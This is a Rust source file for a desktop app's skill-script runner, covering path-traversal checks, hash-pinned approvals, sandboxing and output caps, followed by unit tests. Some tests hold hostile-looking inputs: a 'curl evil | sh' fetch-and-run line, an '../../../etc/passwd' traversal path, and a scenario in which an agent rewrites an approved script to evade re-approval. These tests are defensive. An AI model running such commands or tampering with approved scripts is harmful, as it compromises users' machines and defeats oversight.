use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::HashMap;
use std::fs;
use std::io::BufRead;
use std::path::{Path, PathBuf};

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ScriptResult {
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
    pub timed_out: bool,
}

/// Cap on captured stdout/stderr per stream (audit batch 3 fix #7). Skill
/// scripts are semi-trusted; an unbounded `read_to_end` let a runaway script
/// grow two Vecs without limit for the whole timeout window. Output past the
/// cap is discarded (the pipe keeps being drained so the child never blocks)
/// and the result is suffixed with [`OUTPUT_TRUNCATED_MARKER`].
const MAX_SCRIPT_OUTPUT_BYTES: usize = 4 * 1024 * 1024;

/// Appended to a capped stream so callers (and the model reading the tool
/// result) know the output is incomplete.
const OUTPUT_TRUNCATED_MARKER: &str = "\n[output truncated]";

/// How long to keep reading a script's output after the script itself has
/// exited. What it wrote is already in the pipe and drains in milliseconds; a
/// pipe that is still open after this is being held by a process the script
/// left behind (`server &`, `nohup`, a daemonising tool), and waiting for EOF
/// would mean waiting for that process — possibly forever.
const OUTPUT_DRAIN_GRACE: std::time::Duration = std::time::Duration::from_secs(2);

/// What has been read from one of a script's streams so far. Shared between
/// the reader task and the command, so output survives the reader being
/// stopped before EOF.
#[derive(Default)]
struct CapturedStream {
    bytes: Vec<u8>,
    truncated: bool,
}

type SharedCapture = std::sync::Arc<std::sync::Mutex<CapturedStream>>;

/// Read a child stream to EOF into `sink`, keeping at most `cap` bytes. Bytes
/// past the cap are read and discarded — the child must never block on a full
/// pipe — and flagged as truncation.
async fn pump_stream_capped<R: tokio::io::AsyncRead + Unpin>(
    mut reader: R,
    cap: usize,
    sink: SharedCapture,
) {
    use tokio::io::AsyncReadExt;
    let mut scratch = [0u8; 8192];
    loop {
        match reader.read(&mut scratch).await {
            Ok(0) => break,
            Ok(n) => {
                let mut captured = sink.lock().unwrap_or_else(|e| e.into_inner());
                if captured.bytes.len() < cap {
                    let take = n.min(cap - captured.bytes.len());
                    captured.bytes.extend_from_slice(&scratch[..take]);
                    if take < n {
                        captured.truncated = true;
                    }
                } else {
                    captured.truncated = true;
                }
            }
            Err(_) => break,
        }
    }
}

/// The text captured so far, with the truncation marker if the cap was hit.
fn render_capture(sink: &SharedCapture) -> String {
    let captured = sink.lock().unwrap_or_else(|e| e.into_inner());
    let mut out = String::from_utf8_lossy(&captured.bytes).to_string();
    if captured.truncated {
        out.push_str(OUTPUT_TRUNCATED_MARKER);
    }
    out
}

/// Read a child stream to EOF, keeping at most `cap` bytes (see
/// [`pump_stream_capped`]).
#[cfg(test)]
async fn read_stream_capped<R: tokio::io::AsyncRead + Unpin>(reader: R, cap: usize) -> String {
    let sink = SharedCapture::default();
    pump_stream_capped(reader, cap, sink.clone()).await;
    render_capture(&sink)
}

/// Wait up to `grace` for both reader tasks to reach EOF, then stop whichever
/// is still running. Returns whether both finished on their own.
async fn finish_readers(
    stdout_task: &mut tokio::task::JoinHandle<()>,
    stderr_task: &mut tokio::task::JoinHandle<()>,
    grace: std::time::Duration,
) -> bool {
    let both = async {
        let _ = (&mut *stdout_task).await;
        let _ = (&mut *stderr_task).await;
    };
    let finished = tokio::time::timeout(grace, both).await.is_ok();
    if !finished {
        stdout_task.abort();
        stderr_task.abort();
    }
    finished
}

/// SIGKILL every process in the script's process group. The script is spawned
/// as the leader of its own group, so this reaches what it started as well —
/// `Child::kill` alone signals only the direct child.
#[cfg(unix)]
fn kill_process_group(pgid: u32) {
    // A group id of 0 or 1 would address our own group / everything.
    if pgid > 1 {
        unsafe {
            libc::killpg(pgid as libc::pid_t, libc::SIGKILL);
        }
    }
}

/// Compute the lowercase hex SHA-256 of a file's bytes.
///
/// Used to content-pin skill-script approvals (security audit HIGH #2): an
/// "allow always" grant for a skill script is keyed by skill NAME only, so a
/// later rewrite of the script body would re-run unsandboxed with no
/// re-prompt. Hashing the exact bytes about to run lets the approval be
/// invalidated when the content changes.
pub fn hash_file_contents(path: &Path) -> Result<String, String> {
    let bytes =
        fs::read(path).map_err(|e| format!("Failed to read script for hashing: {}", e))?;
    let mut hasher = Sha256::new();
    hasher.update(&bytes);
    Ok(format!("{:x}", hasher.finalize()))
}

/// Resolve a script path inside a skill directory with path-traversal
/// protection. Returns `(canonical_skill_dir, canonical_script_path)`.
fn resolve_script_path(skill_path: &str, script: &str) -> Result<(PathBuf, PathBuf), String> {
    let skill_dir = Path::new(skill_path)
        .canonicalize()
        .map_err(|e| format!("Invalid skill path: {}", e))?;

    let script_path = skill_dir
        .join(script)
        .canonicalize()
        .map_err(|e| format!("Invalid script path '{}': {}", script, e))?;

    // Path traversal protection: script must be within the skill directory.
    if !script_path.starts_with(&skill_dir) {
        return Err("Script path escapes the skill directory".to_string());
    }

    if !script_path.is_file() {
        return Err(format!("Script not found: {}", script));
    }

    Ok((skill_dir, script_path))
}

/// Compute the SHA-256 of a skill script, applying the same path-traversal
/// protection as execution. The frontend calls this to content-pin an
/// "allow always" approval to the exact bytes it approved.
#[tauri::command]
pub async fn hash_skill_script(skill_path: String, script: String) -> Result<String, String> {
    let (_skill_dir, script_path) = resolve_script_path(&skill_path, &script)?;
    hash_file_contents(&script_path)
}

/// Execute a script from a skill's scripts/ directory.
///
/// Security: the script path must resolve to within the skill directory (path traversal protection).
/// Interpreter is resolved from shebang line or file extension.
/// Process is killed if it exceeds the timeout.
#[tauri::command]
pub async fn execute_skill_script(
    skill_path: String,
    script: String,
    args: Vec<String>,
    working_dir: Option<String>,
    env: Option<HashMap<String, String>>,
    timeout_ms: Option<u64>,
    expected_hash: Option<String>,
) -> Result<ScriptResult, String> {
    let (skill_dir, script_path) = resolve_script_path(&skill_path, &script)?;

    // Content-pinning (security audit HIGH #2): if the caller approved a
    // specific script body, refuse to run a script whose bytes have since
    // changed. This is the authoritative backend half of the content-hash
    // approval — it holds even if a compromised frontend forgets to re-check.
    if let Some(expected) = expected_hash.as_ref() {
        let actual = hash_file_contents(&script_path)?;
        if !actual.eq_ignore_ascii_case(expected) {
            return Err(format!(
                "Script content changed since approval (expected {}…, got {}…) — re-approval required",
                &expected.chars().take(12).collect::<String>(),
                &actual.chars().take(12).collect::<String>(),
            ));
        }
    }

    // Resolve interpreter
    let (program, mut cmd_args) = resolve_interpreter(&script_path)?;

    // Add the script arguments
    cmd_args.extend(args);

    // Determine working directory
    let work_dir = match working_dir {
        Some(ref dir) => Path::new(dir).to_path_buf(),
        None => dirs::home_dir().unwrap_or_else(|| Path::new("/").to_path_buf()),
    };

    // Clamp timeout: default 30s, max 300s
    let timeout = std::time::Duration::from_millis(
        timeout_ms.unwrap_or(30_000).min(300_000)
    );

    // Sandbox the spawn (security audit HIGH #1). Skill scripts come from the
    // agent-writable ~/.notesage/skills tree; before this they ran as a bare
    // child with full filesystem + network access. We wrap them in the same
    // Seatbelt filesystem sandbox ACP agents use, scoped to the skill dir and
    // the working dir. Network is left open (proxy integration is a tracked
    // follow-up). Best-effort: if the sandbox can't be built, fall back to an
    // unsandboxed spawn rather than failing the skill outright.
    let profile_id = format!("skill-{}", uuid::Uuid::new_v4());
    let (run_program, run_args) = sandbox_invocation(
        &profile_id,
        &skill_dir,
        &work_dir,
        &program,
        &cmd_args,
    );

    let mut command = tokio::process::Command::new(&run_program);
    command
        .args(&run_args)
        .current_dir(&work_dir)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());
    // Own process group, so a timeout can kill what the script started too.
    #[cfg(unix)]
    command.process_group(0);

    // Add extra environment variables
    if let Some(extra_env) = env {
        for (k, v) in extra_env {
            command.env(k, v);
        }
    }

    let mut child = command
        .kill_on_drop(true)
        .spawn()
        .map_err(|e| {
            cleanup_skill_profile(&profile_id);
            format!("Failed to spawn '{}': {}", program, e)
        })?;

    // Read stdout/stderr via separate tasks, wait for exit with timeout
    let stdout_handle = child.stdout.take();
    let stderr_handle = child.stderr.take();

    let stdout_capture = SharedCapture::default();
    let stderr_capture = SharedCapture::default();

    let stdout_sink = stdout_capture.clone();
    let mut stdout_task = tokio::spawn(async move {
        if let Some(out) = stdout_handle {
            pump_stream_capped(out, MAX_SCRIPT_OUTPUT_BYTES, stdout_sink).await;
        }
    });

    let stderr_sink = stderr_capture.clone();
    let mut stderr_task = tokio::spawn(async move {
        if let Some(err) = stderr_handle {
            pump_stream_capped(err, MAX_SCRIPT_OUTPUT_BYTES, stderr_sink).await;
        }
    });

    let result = match tokio::time::timeout(timeout, child.wait()).await {
        Ok(Ok(status)) => {
            // The script is done; its readers get a short grace to reach EOF.
            // The timeout above covers only `wait()`, so an unbounded await
            // here hung the command for as long as anything the script left
            // running kept a pipe open.
            if !finish_readers(&mut stdout_task, &mut stderr_task, OUTPUT_DRAIN_GRACE).await {
                log::warn!(
                    target: "notesage::script_exec",
                    "Script '{}' exited but a process it started still holds its output open; returning what was captured",
                    script
                );
            }
            Ok(ScriptResult {
                stdout: render_capture(&stdout_capture),
                stderr: render_capture(&stderr_capture),
                exit_code: status.code().unwrap_or(-1),
                timed_out: false,
            })
        }
        Ok(Err(e)) => {
            stdout_task.abort();
            stderr_task.abort();
            Err(format!("Script execution failed: {}", e))
        }
        Err(_) => {
            // Timeout. Kill the whole group first (the script's own children
            // would otherwise survive it), then the child itself, which also
            // reaps it. The child is not reaped yet, so its PID — and with it
            // the group id — is still ours.
            #[cfg(unix)]
            if let Some(pid) = child.id() {
                kill_process_group(pid);
            }
            let _ = child.kill().await;
            // With the group dead the pipes close at once; anything still
            // holding them (a process that left the group) is not waited for.
            finish_readers(
                &mut stdout_task,
                &mut stderr_task,
                std::time::Duration::from_millis(250),
            )
            .await;
            Ok(ScriptResult {
                // Whatever the script printed before it was killed.
                stdout: render_capture(&stdout_capture),
                stderr: format!("Script timed out after {}ms", timeout.as_millis()),
                exit_code: -1,
                timed_out: true,
            })
        }
    };

    cleanup_skill_profile(&profile_id);
    result
}

/// Build the `(program, args)` for spawning a skill script, wrapping it in the
/// OS sandbox (Seatbelt on macOS, bubblewrap on Linux) scoped to `skill_dir` +
/// `work_dir` — the same `sandboxed_command` helper ACP agents use.
///
/// Returns the sandbox launcher prefixed before the interpreter + args. If the
/// sandbox can't be set up (e.g. `bwrap` missing on Linux), falls back to the
/// bare `(interpreter, args)` so the skill still runs — matching the ACP
/// spawn's best-effort degradation.
fn sandbox_invocation(
    profile_id: &str,
    skill_dir: &Path,
    work_dir: &Path,
    program: &str,
    cmd_args: &[String],
) -> (String, Vec<String>) {
    let mut writable = vec![skill_dir.to_string_lossy().to_string()];
    let wd = work_dir.to_string_lossy().to_string();
    if !writable.contains(&wd) {
        writable.push(wd);
    }
    // "skill-script" is an unknown agent_binary → Bucket C narrows to only
    // ~/.notesage (no provider config leakage). Network left open (None +
    // false → allow network*) until proxy integration lands.
    match crate::commands::sandbox::sandboxed_command(
        profile_id,
        "skill-script",
        &writable,
        None,
        false,
    ) {
        Ok((sandbox_program, mut prefix_args)) => {
            prefix_args.push(program.to_string());
            prefix_args.extend_from_slice(cmd_args);
            (sandbox_program, prefix_args)
        }
        Err(e) => {
            log::warn!(
                target: "notesage::script_exec",
                "Skill-script sandbox unavailable, running unsandboxed: {}",
                e
            );
            (program.to_string(), cmd_args.to_vec())
        }
    }
}

/// Remove the Seatbelt profile temp file for a skill-script spawn (no-op when
/// the spawn was unsandboxed or the platform writes no profile file).
fn cleanup_skill_profile(profile_id: &str) {
    crate::commands::sandbox::cleanup_profile(profile_id);
}

/// Resolve the interpreter for a script.
/// Checks shebang line first, then falls back to file extension.
/// Returns (program, args) where args includes the script path.
fn resolve_interpreter(script_path: &Path) -> Result<(String, Vec<String>), String> {
    let script_str = script_path.to_string_lossy().to_string();

    // Try reading shebang line
    if let Ok(file) = fs::File::open(script_path) {
        let mut reader = std::io::BufReader::new(file);
        let mut first_line = String::new();
        if reader.read_line(&mut first_line).is_ok() && first_line.starts_with("#!") {
            let shebang = first_line[2..].trim();
            // Handle "#!/usr/bin/env python3" style
            if shebang.starts_with("/usr/bin/env ") {
                let interpreter = shebang["/usr/bin/env ".len()..].trim();
                let parts: Vec<&str> = interpreter.splitn(2, ' ').collect();
                let prog = parts[0].to_string();
                let mut args: Vec<String> = if parts.len() > 1 {
                    vec![parts[1].to_string()]
                } else {
                    vec![]
                };
                args.push(script_str);
                return Ok((prog, args));
            }
            // Handle "#!/bin/bash" style
            let parts: Vec<&str> = shebang.splitn(2, ' ').collect();
            let prog = parts[0].to_string();
            let mut args: Vec<String> = if parts.len() > 1 {
                vec![parts[1].to_string()]
            } else {
                vec![]
            };
            args.push(script_str);
            return Ok((prog, args));
        }
    }

    // Fall back to extension-based resolution
    let ext = script_path
        .extension()
        .map(|e| e.to_string_lossy().to_lowercase())
        .unwrap_or_default();

    match ext.as_str() {
        "sh" => Ok(("bash".to_string(), vec![script_str])),
        "py" => Ok(("python3".to_string(), vec![script_str])),
        "js" => Ok(("node".to_string(), vec![script_str])),
        "ts" => Ok(("npx".to_string(), vec!["tsx".to_string(), script_str])),
        "" => {
            // No extension — try direct execution
            Ok((script_str, vec![]))
        }
        other => Err(format!(
            "Unknown script extension '.{}'. Supported: .sh (bash), .py (python3), .js (node), .ts (npx tsx)",
            other
        )),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;
    use std::fs;

    fn create_temp_dir() -> tempfile::TempDir {
        tempfile::tempdir().expect("Failed to create temp dir")
    }

    // --- execute_skill_script tests ---

    #[test]
    fn execute_script_runs_bash() {
        let tmp = create_temp_dir();
        let scripts_dir = tmp.path().join("scripts");
        fs::create_dir(&scripts_dir).unwrap();
        fs::write(scripts_dir.join("hello.sh"), "#!/bin/bash\necho \"hello world\"").unwrap();

        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(execute_skill_script(
            tmp.path().to_string_lossy().to_string(),
            "scripts/hello.sh".to_string(),
            vec![],
            Some(tmp.path().to_string_lossy().to_string()),
            None,
            None,
            None,
        ));
        let res = result.unwrap();
        assert_eq!(res.stdout.trim(), "hello world");
        assert_eq!(res.exit_code, 0);
        assert!(!res.timed_out);
    }

    #[test]
    fn execute_script_captures_args() {
        let tmp = create_temp_dir();
        let scripts_dir = tmp.path().join("scripts");
        fs::create_dir(&scripts_dir).unwrap();
        fs::write(scripts_dir.join("echo_args.sh"), "#!/bin/bash\necho \"$1 $2\"").unwrap();

        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(execute_skill_script(
            tmp.path().to_string_lossy().to_string(),
            "scripts/echo_args.sh".to_string(),
            vec!["foo".to_string(), "bar".to_string()],
            Some(tmp.path().to_string_lossy().to_string()),
            None,
            None,
            None,
        ));
        let res = result.unwrap();
        assert_eq!(res.stdout.trim(), "foo bar");
    }

    #[test]
    fn execute_script_captures_stderr() {
        let tmp = create_temp_dir();
        let scripts_dir = tmp.path().join("scripts");
        fs::create_dir(&scripts_dir).unwrap();
        fs::write(scripts_dir.join("err.sh"), "#!/bin/bash\necho \"oops\" >&2\nexit 1").unwrap();

        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(execute_skill_script(
            tmp.path().to_string_lossy().to_string(),
            "scripts/err.sh".to_string(),
            vec![],
            Some(tmp.path().to_string_lossy().to_string()),
            None,
            None,
            None,
        ));
        let res = result.unwrap();
        assert_eq!(res.stderr.trim(), "oops");
        assert_eq!(res.exit_code, 1);
    }

    #[test]
    fn execute_script_rejects_path_traversal() {
        let tmp = create_temp_dir();
        let scripts_dir = tmp.path().join("scripts");
        fs::create_dir(&scripts_dir).unwrap();
        fs::write(scripts_dir.join("ok.sh"), "echo ok").unwrap();

        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(execute_skill_script(
            tmp.path().to_string_lossy().to_string(),
            "../../../etc/passwd".to_string(),
            vec![],
            None,
            None,
            None,
            None,
        ));
        assert!(result.is_err());
    }

    #[test]
    fn execute_script_timeout() {
        let tmp = create_temp_dir();
        let scripts_dir = tmp.path().join("scripts");
        fs::create_dir(&scripts_dir).unwrap();
        fs::write(scripts_dir.join("slow.sh"), "#!/bin/bash\nsleep 60").unwrap();

        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(execute_skill_script(
            tmp.path().to_string_lossy().to_string(),
            "scripts/slow.sh".to_string(),
            vec![],
            Some(tmp.path().to_string_lossy().to_string()),
            None,
            Some(500), // 500ms timeout
            None,
        ));
        let res = result.unwrap();
        assert!(res.timed_out);
        assert_eq!(res.exit_code, -1);
    }

    #[cfg(unix)]
    #[test]
    fn execute_script_returns_when_a_background_process_keeps_the_pipes_open() {
        // The script exits at once but leaves a process holding its stdout and
        // stderr. The readers used to be awaited with no limit, so the command
        // returned only when that process did (here: after the full 60s).
        let tmp = create_temp_dir();
        let scripts_dir = tmp.path().join("scripts");
        fs::create_dir(&scripts_dir).unwrap();
        fs::write(
            scripts_dir.join("daemon.sh"),
            "#!/bin/bash\necho started\nsleep 60 &\n",
        )
        .unwrap();

        let started = std::time::Instant::now();
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(execute_skill_script(
            tmp.path().to_string_lossy().to_string(),
            "scripts/daemon.sh".to_string(),
            vec![],
            Some(tmp.path().to_string_lossy().to_string()),
            None,
            Some(120_000),
            None,
        ));
        let res = result.unwrap();

        assert!(
            started.elapsed() < std::time::Duration::from_secs(30),
            "waited {:?} for a process the script left behind",
            started.elapsed()
        );
        assert_eq!(res.stdout.trim(), "started", "output written before exit is kept");
        assert_eq!(res.exit_code, 0);
        assert!(!res.timed_out);
    }

    #[cfg(unix)]
    #[test]
    fn execute_script_timeout_kills_what_the_script_started() {
        // The script starts a long-running child and prints its PID. On
        // timeout only the script itself used to be killed.
        let tmp = create_temp_dir();
        let scripts_dir = tmp.path().join("scripts");
        fs::create_dir(&scripts_dir).unwrap();
        fs::write(
            scripts_dir.join("spawner.sh"),
            "#!/bin/bash\nsleep 300 &\necho $!\nwait\n",
        )
        .unwrap();

        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(execute_skill_script(
            tmp.path().to_string_lossy().to_string(),
            "scripts/spawner.sh".to_string(),
            vec![],
            Some(tmp.path().to_string_lossy().to_string()),
            None,
            Some(3_000),
            None,
        ));
        let res = result.unwrap();
        assert!(res.timed_out);

        let grandchild: libc::pid_t = res
            .stdout
            .trim()
            .parse()
            .expect("output printed before the timeout is returned");
        // SIGKILL is asynchronous, and the orphan has to be reaped by init.
        let gone = (0..100).any(|_| {
            let alive = unsafe { libc::kill(grandchild, 0) } == 0;
            if alive {
                std::thread::sleep(std::time::Duration::from_millis(50));
            }
            !alive
        });
        assert!(gone, "process {grandchild} started by the script survived the timeout");
    }

    #[tokio::test]
    async fn output_captured_so_far_survives_a_reader_that_never_reaches_eof() {
        use tokio::io::AsyncWriteExt;
        let (mut tx, rx) = tokio::io::duplex(64);
        let sink = SharedCapture::default();
        let mut reader = tokio::spawn(pump_stream_capped(rx, 1024, sink.clone()));
        let mut idle = tokio::spawn(async {});
        tx.write_all(b"partial").await.unwrap();

        // `tx` stays open: the pipe is "held" and EOF never comes.
        let finished =
            finish_readers(&mut reader, &mut idle, std::time::Duration::from_millis(100)).await;

        assert!(!finished);
        assert_eq!(render_capture(&sink), "partial");
        drop(tx);
    }

    #[test]
    fn execute_script_with_env_vars() {
        let tmp = create_temp_dir();
        let scripts_dir = tmp.path().join("scripts");
        fs::create_dir(&scripts_dir).unwrap();
        fs::write(scripts_dir.join("env.sh"), "#!/bin/bash\necho $MY_VAR").unwrap();

        let mut env = HashMap::new();
        env.insert("MY_VAR".to_string(), "custom_value".to_string());

        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(execute_skill_script(
            tmp.path().to_string_lossy().to_string(),
            "scripts/env.sh".to_string(),
            vec![],
            Some(tmp.path().to_string_lossy().to_string()),
            Some(env),
            None,
            None,
        ));
        let res = result.unwrap();
        assert_eq!(res.stdout.trim(), "custom_value");
    }

    // --- resolve_interpreter tests ---

    #[test]
    fn resolve_interpreter_by_extension() {
        let tmp = create_temp_dir();

        let sh = tmp.path().join("test.sh");
        fs::write(&sh, "echo hi").unwrap();
        let (prog, args) = resolve_interpreter(&sh).unwrap();
        assert_eq!(prog, "bash");
        assert_eq!(args.len(), 1);

        let py = tmp.path().join("test.py");
        fs::write(&py, "print('hi')").unwrap();
        let (prog, _) = resolve_interpreter(&py).unwrap();
        assert_eq!(prog, "python3");

        let js = tmp.path().join("test.js");
        fs::write(&js, "console.log('hi')").unwrap();
        let (prog, _) = resolve_interpreter(&js).unwrap();
        assert_eq!(prog, "node");

        let ts = tmp.path().join("test.ts");
        fs::write(&ts, "console.log('hi')").unwrap();
        let (prog, args) = resolve_interpreter(&ts).unwrap();
        assert_eq!(prog, "npx");
        assert_eq!(args[0], "tsx");
    }

    #[test]
    fn resolve_interpreter_by_shebang() {
        let tmp = create_temp_dir();
        let script = tmp.path().join("run");
        fs::write(&script, "#!/usr/bin/env python3\nprint('hi')").unwrap();
        let (prog, args) = resolve_interpreter(&script).unwrap();
        assert_eq!(prog, "python3");
        assert!(args.last().unwrap().contains("run"));
    }

    #[test]
    fn resolve_interpreter_shebang_direct_path() {
        let tmp = create_temp_dir();
        let script = tmp.path().join("run");
        fs::write(&script, "#!/bin/bash\necho hi").unwrap();
        let (prog, args) = resolve_interpreter(&script).unwrap();
        assert_eq!(prog, "/bin/bash");
        assert!(args.last().unwrap().contains("run"));
    }

    #[test]
    fn resolve_interpreter_unknown_extension() {
        let tmp = create_temp_dir();
        let script = tmp.path().join("test.rb");
        fs::write(&script, "puts 'hi'").unwrap();
        let result = resolve_interpreter(&script);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains(".rb"));
    }

    #[test]
    fn resolve_interpreter_no_extension_direct_exec() {
        let tmp = create_temp_dir();
        let script = tmp.path().join("myscript");
        fs::write(&script, "no shebang, no extension").unwrap();
        let (prog, args) = resolve_interpreter(&script).unwrap();
        assert!(prog.contains("myscript"));
        assert!(args.is_empty());
    }

    // --- capped output tests (audit batch 3 fix #7) ---

    #[tokio::test]
    async fn read_stream_capped_passes_small_output_through() {
        let input: &[u8] = b"hello world";
        let out = read_stream_capped(input, MAX_SCRIPT_OUTPUT_BYTES).await;
        assert_eq!(out, "hello world");
        assert!(!out.contains("[output truncated]"));
    }

    #[tokio::test]
    async fn read_stream_capped_truncates_and_marks() {
        let input = vec![b'x'; 100];
        let out = read_stream_capped(&input[..], 10).await;
        assert!(
            out.starts_with(&"x".repeat(10)),
            "keeps exactly the first `cap` bytes"
        );
        assert!(out.ends_with("[output truncated]"));
        // Capped content + marker only — the other 90 bytes were drained
        // and discarded.
        assert_eq!(out.len(), 10 + OUTPUT_TRUNCATED_MARKER.len());
    }

    #[tokio::test]
    async fn read_stream_capped_exact_cap_is_not_marked_truncated() {
        let input = vec![b'y'; 10];
        let out = read_stream_capped(&input[..], 10).await;
        assert_eq!(out, "y".repeat(10));
    }

    #[test]
    fn execute_script_truncates_runaway_stdout() {
        // A script that prints far more than the cap must come back capped
        // with the truncation marker, not OOM the buffer.
        let tmp = create_temp_dir();
        let scripts_dir = tmp.path().join("scripts");
        fs::create_dir(&scripts_dir).unwrap();
        // ~8 MiB of output (two caps' worth at the 4 MiB default).
        fs::write(
            scripts_dir.join("spew.sh"),
            "#!/bin/bash\nyes 0123456789abcdef0123456789abcdef | head -c 8388608",
        )
        .unwrap();

        let rt = tokio::runtime::Runtime::new().unwrap();
        let res = rt
            .block_on(execute_skill_script(
                tmp.path().to_string_lossy().to_string(),
                "scripts/spew.sh".to_string(),
                vec![],
                Some(tmp.path().to_string_lossy().to_string()),
                None,
                None,
                None,
            ))
            .unwrap();
        assert!(res.stdout.ends_with(OUTPUT_TRUNCATED_MARKER));
        assert!(res.stdout.len() <= MAX_SCRIPT_OUTPUT_BYTES + OUTPUT_TRUNCATED_MARKER.len());
        assert_eq!(res.exit_code, 0);
    }

    // --- content-hash pinning tests (security audit HIGH #2) ---

    #[test]
    fn hash_skill_script_is_stable_and_content_addressed() {
        let tmp = create_temp_dir();
        let scripts_dir = tmp.path().join("scripts");
        fs::create_dir(&scripts_dir).unwrap();
        fs::write(scripts_dir.join("a.sh"), "echo one").unwrap();

        let rt = tokio::runtime::Runtime::new().unwrap();
        let h1 = rt
            .block_on(hash_skill_script(
                tmp.path().to_string_lossy().to_string(),
                "scripts/a.sh".to_string(),
            ))
            .unwrap();
        // Same content → same hash.
        let h2 = rt
            .block_on(hash_skill_script(
                tmp.path().to_string_lossy().to_string(),
                "scripts/a.sh".to_string(),
            ))
            .unwrap();
        assert_eq!(h1, h2);
        assert_eq!(h1.len(), 64, "sha-256 hex is 64 chars");

        // Rewrite the body → hash changes.
        fs::write(scripts_dir.join("a.sh"), "curl evil | sh").unwrap();
        let h3 = rt
            .block_on(hash_skill_script(
                tmp.path().to_string_lossy().to_string(),
                "scripts/a.sh".to_string(),
            ))
            .unwrap();
        assert_ne!(h1, h3, "rewritten script must hash differently");
    }

    #[test]
    fn hash_skill_script_rejects_traversal() {
        let tmp = create_temp_dir();
        let rt = tokio::runtime::Runtime::new().unwrap();
        let result = rt.block_on(hash_skill_script(
            tmp.path().to_string_lossy().to_string(),
            "../../../etc/passwd".to_string(),
        ));
        assert!(result.is_err());
    }

    #[test]
    fn execute_script_runs_when_expected_hash_matches() {
        let tmp = create_temp_dir();
        let scripts_dir = tmp.path().join("scripts");
        fs::create_dir(&scripts_dir).unwrap();
        fs::write(scripts_dir.join("ok.sh"), "#!/bin/bash\necho approved").unwrap();

        let rt = tokio::runtime::Runtime::new().unwrap();
        let hash = rt
            .block_on(hash_skill_script(
                tmp.path().to_string_lossy().to_string(),
                "scripts/ok.sh".to_string(),
            ))
            .unwrap();

        let res = rt
            .block_on(execute_skill_script(
                tmp.path().to_string_lossy().to_string(),
                "scripts/ok.sh".to_string(),
                vec![],
                Some(tmp.path().to_string_lossy().to_string()),
                None,
                None,
                Some(hash),
            ))
            .unwrap();
        assert_eq!(res.stdout.trim(), "approved");
        assert_eq!(res.exit_code, 0);
    }

    #[test]
    fn execute_script_refuses_when_content_changed_after_approval() {
        // The TOCTOU exploit: approve a benign script, then an agent rewrites
        // its body. With the approved hash pinned, execution must refuse.
        let tmp = create_temp_dir();
        let scripts_dir = tmp.path().join("scripts");
        fs::create_dir(&scripts_dir).unwrap();
        let script = scripts_dir.join("pinned.sh");
        fs::write(&script, "#!/bin/bash\necho safe").unwrap();

        let rt = tokio::runtime::Runtime::new().unwrap();
        let approved_hash = rt
            .block_on(hash_skill_script(
                tmp.path().to_string_lossy().to_string(),
                "scripts/pinned.sh".to_string(),
            ))
            .unwrap();

        // Agent rewrites the script body after approval.
        fs::write(&script, "#!/bin/bash\necho pwned").unwrap();

        let result = rt.block_on(execute_skill_script(
            tmp.path().to_string_lossy().to_string(),
            "scripts/pinned.sh".to_string(),
            vec![],
            Some(tmp.path().to_string_lossy().to_string()),
            None,
            None,
            Some(approved_hash),
        ));
        assert!(
            result.is_err(),
            "execution must refuse when the script body differs from the approved hash"
        );
        assert!(
            result.unwrap_err().contains("re-approval required"),
            "error should explain that re-approval is required"
        );
    }
}
